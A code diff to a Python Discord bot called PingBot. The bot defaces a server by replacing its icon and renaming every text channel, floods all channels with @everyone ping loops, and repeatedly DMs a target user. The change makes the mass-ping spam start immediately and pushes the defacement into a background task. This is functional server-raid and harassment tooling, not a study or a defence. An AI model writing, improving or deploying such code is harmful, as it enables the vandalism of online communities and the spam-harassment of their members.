@@ -103,34 +103,23 @@ class PingBot(discord.Client):
             if guild is None:
                 return
 
-            # Change server icon from photo_1.png
-            try:
-                with open(PHOTO_PATH, "rb") as f:
-                    icon_bytes = f.read()
-                await guild.edit(icon=icon_bytes)
-                logger.info(f"[{self.bot_name}] Changed server icon for {guild.name}")
-            except FileNotFoundError:
-                logger.warning(f"[{self.bot_name}] {PHOTO_PATH} not found — skipping icon change")
-            except Exception as e:
-                logger.warning(f"[{self.bot_name}] Could not change server icon: {e}")
+            # Cancel any existing loops so setup always works fresh
+            for task in self._running_loops.values():
+                if not task.done():
+                    task.cancel()
+            self._running_loops.clear()
 
-            # Rename all text channels in parallel
-            rename_name = self._last_create_name
-            await asyncio.gather(
-                *[self._safe_rename_channel(ch, rename_name) for ch in guild.text_channels],
-                return_exceptions=True
-            )
-
-            # Start @everyone ping loops in all channels
+            # Start @everyone ping loops immediately across all channels
             text_channels = list(guild.text_channels)
             started = 0
             for ch in text_channels:
-                cid = ch.id
-                if cid not in self._running_loops or self._running_loops[cid].done():
-                    task = asyncio.create_task(self._everyone_loop(ch, ping_limit))
-                    self._running_loops[cid] = task
-                    started += 1
+                task = asyncio.create_task(self._everyone_loop(ch, ping_limit))
+                self._running_loops[ch.id] = task
+                started += 1
             await message.channel.send(f"Sending @everyone {ping_limit} times across {started} channel(s)!")
+
+            # Do icon change and renames in background so pings aren't delayed
+            asyncio.create_task(self._setup_background(guild))
 
         elif cmd.startswith("create "):
             parts = raw.split()
@@ -213,6 +202,25 @@ class PingBot(discord.Client):
                 logger.error(f"[{self.bot_name}] Error DMing {user}: {e}")
                 await asyncio.sleep(1)
         logger.info(f"[{self.bot_name}] Finished DMing {user} {count} time(s)")
+
+    async def _setup_background(self, guild: discord.Guild):
+        # Change server icon from photo_1.png
+        try:
+            with open(PHOTO_PATH, "rb") as f:
+                icon_bytes = f.read()
+            await guild.edit(icon=icon_bytes)
+            logger.info(f"[{self.bot_name}] Changed server icon for {guild.name}")
+        except FileNotFoundError:
+            logger.warning(f"[{self.bot_name}] {PHOTO_PATH} not found — skipping icon change")
+        except Exception as e:
+            logger.warning(f"[{self.bot_name}] Could not change server icon: {e}")
+
+        # Rename all text channels in parallel
+        rename_name = self._last_create_name
+        await asyncio.gather(
+            *[self._safe_rename_channel(ch, rename_name) for ch in guild.text_channels],
+            return_exceptions=True
+        )
 
     async def _safe_rename_channel(self, channel: discord.TextChannel, name: str):
         try:
